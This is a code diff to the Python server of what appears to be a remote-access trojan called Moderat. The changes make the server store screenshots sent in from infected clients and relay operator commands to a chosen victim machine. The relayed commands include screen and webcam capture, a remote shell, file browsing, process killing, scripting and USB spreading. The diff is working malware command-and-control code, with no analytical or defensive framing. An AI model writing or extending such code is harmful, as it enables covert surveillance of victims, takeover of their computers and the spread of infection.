@@ -2,13 +2,14 @@ import ast
 import logging
 import coloredlogs
 import os
+from datetime import datetime
 
 from twisted.internet.protocol import ServerFactory
 from twisted.internet import task
 from twisted.protocols.basic import LineReceiver
 
 from mdb import MDB
-from libs import Mid
+from libs import Mid, PhotoFactory
 
 
 class ModeratServerProtocol(LineReceiver):
@@ -52,6 +53,7 @@ class ModeratServerProtocol(LineReceiver):
         self.moduleID = dataDict['module_id'] if dataDict.has_key('module_id') else ''
         self.clientKey = dataDict['key'] if dataDict.has_key('key') else ''
         self.From = dataDict['from'] if dataDict.has_key('from') else ''
+        self.To = dataDict['to'] if dataDict.has_key('to') else ''
 
         if self.From == 'client':
             self.clientCommands()
@@ -74,7 +76,6 @@ class ModeratServerProtocol(LineReceiver):
             if self.payload == 'noKey':
                 client_id = Mid.generateMid()
                 self.factory.log.debug('[CLIENT] Generate New Key (%s)' % client_id)
-                self.sendMessage(self, client_id)
             else:
                 client_id = self.payload
             self.factory.clients[client_id] = {
@@ -84,6 +85,7 @@ class ModeratServerProtocol(LineReceiver):
             self.factory.log.debug('[CLIENT] New Client from %s' % self.transport.getPeer())
             self.factory.database.createClient('admin', client_id, ipAddress)
             self.factory.database.setClientStatus(client_id, True)
+            self.sendMessage(self, client_id)
 
         elif self.mode == 'infoChecker':
             if type(self.payload) is dict:
@@ -98,8 +100,17 @@ class ModeratServerProtocol(LineReceiver):
                     'protocol': protocol, 'status': True,
                 }
 
+        elif self.mode == 'screenshotLog':
+            if type(self.payload) is dict:
+                imagePath = PhotoFactory.save_image(self.payload, self.clientKey, datetime.now())
+                self.factory.database.addScreenshot(self.clientKey, self.payload['title_name'], imagePath)
+                self.factory.log.debug('[CLIENT] Screenshot Received From {}'.format(self.transport.getPeer()))
         else:
-            self.factory.log.warning('[CLIENT] Bad Mode [{}] From [{}]'.format(self.mode, self.transport.getPeer()))
+            if self.factory.moderators.has_key(self.sessionID):
+                self.sendMessage(self.factory.moderators[self.sessionID]['protocol'], self.payload)
+                self.factory.log.debug(
+                    '[CLIENT] Playback Mode {} From {} For {}'.format(self.mode,self.transport.getPeer(),
+                                                                      self.factory.moderators[self.sessionID]['username']))
 
     def moderatorCommands(self):
         ipAddress = self.transport.getPeer().host
@@ -277,11 +288,12 @@ class ModeratServerProtocol(LineReceiver):
                     moderator.username, self.payload))
 
             # Forward To Client
-            elif self.mode in ['getScreen', 'getWebcam', 'setLogSettings', 'updateSource', 'p2pMode',
+            elif self.mode in ['getScreen', 'getWebcam', 'clientSettings', 'updateSource', 'p2pMode',
                           'shellMode', 'explorerMode', 'terminateProcess', 'scriptingMode', 'usbSpreading']:
                 try:
-                    self.sendMessage(self.factory.clients[self.clientKey]['protocol'], self.payload)
+                    self.sendMessage(self.factory.clients[self.To]['protocol'], self.payload)
                 except KeyError as e:
+                    print e
                     pass
             else:
                 self.factory.log.warning('[MODERATOR] Malformed Mode [{0}] From [{1}]'.format(self.mode, moderator.username))
